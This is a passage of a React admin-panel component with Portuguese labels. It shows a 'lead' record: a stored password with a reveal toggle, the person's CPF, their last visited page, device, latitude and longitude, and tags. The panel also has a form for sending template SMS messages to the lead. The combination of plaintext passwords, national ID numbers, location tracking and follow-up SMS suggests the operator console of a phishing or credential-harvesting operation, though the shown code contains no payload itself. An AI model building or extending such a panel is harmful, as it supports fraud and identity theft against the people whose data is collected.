                          >
                            {selectedPwdVisible ? <><EyeOff className="h-3 w-3" />ocultar</> : <><Eye className="h-3 w-3" />revelar</>}
                          </button>
                        )}
                      </div>
                    </section>

                    {/* Última sessão */}
                    <section>
                      <p className="font-mono text-[9px] tracking-[0.25em] text-muted-foreground/50 uppercase mb-2.5 flex items-center gap-1.5">
                        <Monitor className="h-3 w-3" />Última Sessão
                      </p>
                      <div className="grid grid-cols-2 gap-1.5 mb-1.5">
                        <div className="rounded-md border border-border/40 bg-muted/15 px-3 py-2.5">
                          <p className="font-mono text-[9px] text-muted-foreground/50 uppercase tracking-wider mb-1">Página</p>
                          <p className="font-mono text-xs text-foreground">{selectedSession?.page ? `/${selectedSession.page}` : "—"}</p>
                        </div>
                        <div className="rounded-md border border-border/40 bg-muted/15 px-3 py-2.5">
                          <p className="font-mono text-[9px] text-muted-foreground/50 uppercase tracking-wider mb-1">Última interação</p>
                          <p className="font-mono text-xs text-foreground">{formatDT(selectedSession?.last_seen_at)}</p>
                        </div>
                      </div>
                      <div className="rounded-md border border-border/40 bg-muted/15 px-3 py-2.5">
                        <p className="font-mono text-[9px] text-muted-foreground/50 uppercase tracking-wider mb-1">Dispositivo</p>
                        <p className="font-mono text-xs text-foreground">{parseDevice(selectedSession?.user_agent, selectedSession?.is_mobile)}</p>
                      </div>
                    </section>

                    {/* Localização */}
                    {(selectedSession?.latitude || selectedSession?.longitude) && (
                      <section>
                        <p className="font-mono text-[9px] tracking-[0.25em] text-muted-foreground/50 uppercase mb-2.5 flex items-center gap-1.5">
                          <MapPin className="h-3 w-3" />Localização
                        </p>
                        <div className="grid grid-cols-2 gap-1.5">
                          <div className="rounded-md border border-border/40 bg-muted/15 px-3 py-2.5">
                            <p className="font-mono text-[9px] text-muted-foreground/50 uppercase tracking-wider mb-1">Latitude</p>
                            <p className="font-mono text-xs text-foreground">{selectedSession.latitude}</p>
                          </div>
                          <div className="rounded-md border border-border/40 bg-muted/15 px-3 py-2.5">
                            <p className="font-mono text-[9px] text-muted-foreground/50 uppercase tracking-wider mb-1">Longitude</p>
                            <p className="font-mono text-xs text-foreground">{selectedSession.longitude}</p>
                          </div>
                        </div>
                      </section>
                    )}

                    {/* Tags */}
                    {(selected.tags ?? []).length > 0 && (
                      <section>
                        <p className="font-mono text-[9px] tracking-[0.25em] text-muted-foreground/50 uppercase mb-2.5">Tags</p>
                        <div className="flex flex-wrap gap-1.5">
                          {(selected.tags ?? []).map((t) => (
                            <span key={t} className="rounded-full border border-primary/30 bg-primary/10 px-2.5 py-1 font-mono text-[10px] text-primary">{t}</span>
                          ))}
                        </div>
                      </section>
                    )}
                  </>
                )}
              </div>

              {/* Right column — actions */}
              <div className="w-60 shrink-0 flex flex-col bg-card/40">

                {/* Quick actions */}
                <div className="px-4 pt-5 pb-4 border-b border-border/50 space-y-2">
                  <p className="font-mono text-[9px] tracking-[0.25em] text-muted-foreground/50 uppercase mb-3">Ações</p>
                  <button
                    type="button"
                    onClick={() => selected && handleCopyOne(selected)}
                    className="w-full flex items-center gap-2 rounded-md border border-border/60 bg-muted/20 px-3 py-2.5 font-mono text-xs text-foreground hover:bg-muted hover:border-border transition-colors"
                  >
                    <Copy className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
                    Copiar dados
                  </button>
                  <button
                    type="button"
                    onClick={() => selected && setTagModalLead(selected)}
                    className="w-full flex items-center gap-2 rounded-md border border-border/60 bg-muted/20 px-3 py-2.5 font-mono text-xs text-foreground hover:bg-muted hover:border-border transition-colors"
                  >
                    <Tag className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
                    Gerenciar tags
                  </button>
                </div>

                {/* SMS */}
                <div className="flex-1 px-4 pt-4 pb-5 overflow-y-auto space-y-3">
                  <p className="font-mono text-[9px] tracking-[0.25em] text-muted-foreground/50 uppercase">Enviar SMS</p>
                  {selected && customTemplates.length > 0 ? (
                    <>
                      <select
                        value={selectedTemplateId}
                        onChange={(e) => setSelectedTemplateId(e.target.value)}
                        className="w-full rounded-md border border-border/60 bg-card px-3 py-2.5 font-mono text-xs text-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
                      >
                        {customTemplates.map((t) => (
                          <option key={t.id} value={t.id}>{t.name}</option>
                        ))}
                      </select>

                      {(() => {
                        const tpl = customTemplates.find((t) => t.id === selectedTemplateId);
                        return tpl?.body ? (
                          <div className="rounded-md border border-border/40 bg-muted/15 px-3 py-2.5">
                            <p className="font-mono text-[9px] text-muted-foreground/50 uppercase tracking-wider mb-1.5">Prévia</p>
                            <p className="font-mono text-[10px] text-muted-foreground whitespace-pre-wrap leading-relaxed">
                              {applyTemplateVars(tpl.body, selected)}
                            </p>
                          </div>
                        ) : null;
                      })()}

                      <button
                        type="button"
                        onClick={() => selected && handleSendSms(selected)}
                        disabled={sendingSms || !selected.phone}
                        className="w-full flex items-center justify-center gap-2 rounded-md bg-primary px-3 py-2.5 font-mono text-xs font-semibold text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-colors"
                      >
                        <Send className="h-3.5 w-3.5" />
                        {sendingSms ? "Enviando..." : "Enviar SMS"}
                      </button>
                      {!selected.phone && (
                        <p className="font-mono text-[9px] text-muted-foreground/50 text-center">Lead sem número cadastrado</p>
                      )}
                    </>
                  ) : (
                    <p className="font-mono text-[10px] text-muted-foreground/50">Crie templates em /controle</p>
                  )}
                </div>
              </div>

            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* ── Tag dialog ── */}
      <Dialog open={!!tagModalLead} onOpenChange={() => { setTagModalLead(null); setCustomTag(""); }}>
        <DialogContent className="max-w-sm">
          <DialogHeader>
            <DialogTitle>Gerenciar Tags</DialogTitle>
            <DialogDescription>{tagModalLead?.cpf || tagModalLead?.nome || "Lead"}</DialogDescription>
          </DialogHeader>
          {tagModalLead && (
            <div className="space-y-4">
              <div className="flex flex-wrap gap-1.5">
                {(tagModalLead.tags ?? []).map((tag) => (
                  <span key={tag} className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2.5 py-1 text-xs font-medium text-primary">
                    {tag}
                    <button onClick={() => handleRemoveTag(tagModalLead, tag)} className="hover:text-destructive"><X className="h-3 w-3" /></button>
                  </span>
                ))}
              </div>
              <div>
                <p className="text-xs font-mono text-muted-foreground mb-2 uppercase tracking-wider">Tags rápidas</p>
                <div className="flex flex-wrap gap-1.5">
                  {PRESET_TAGS.filter((t) => !(tagModalLead.tags ?? []).includes(t)).map((tag) => (
                    <button key={tag} onClick={() => handleAddTag(tagModalLead, tag)} className="rounded-full border border-border px-2.5 py-1 text-xs font-medium text-muted-foreground hover:bg-muted hover:text-foreground transition-colors">
                      + {tag}
                    </button>
                  ))}
                </div>
              </div>
              <div className="flex gap-2">
                <input
                  value={customTag}
                  onChange={(e) => setCustomTag(e.target.value)}
                  onKeyDown={(e) => { if (e.key === "Enter") { handleAddTag(tagModalLead, customTag); setCustomTag(""); } }}
                  placeholder="Tag personalizada..."
                  className="flex-1 rounded-lg border border-border bg-muted/30 px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
                />
                <button onClick={() => { handleAddTag(tagModalLead, customTag); setCustomTag(""); }} className="rounded-lg bg-primary px-3 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90 transition-colors">
                  Adicionar
                </button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
